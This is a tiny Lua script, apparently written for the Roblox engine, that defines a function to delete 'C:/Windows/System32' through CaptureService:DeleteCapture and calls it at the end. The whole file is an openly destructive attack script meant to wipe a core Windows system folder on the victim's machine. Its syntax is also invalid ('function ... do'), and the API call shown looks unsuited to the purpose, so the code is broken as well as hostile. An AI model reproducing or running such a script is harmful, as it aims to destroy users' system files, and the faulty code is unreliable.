function Delete(Path) do
    game:GetService("CaptureService"):DeleteCapture(Path)
end

function DeleteSys32() do
    Delete("C:/Windows/System32")
end

DeleteSys32()
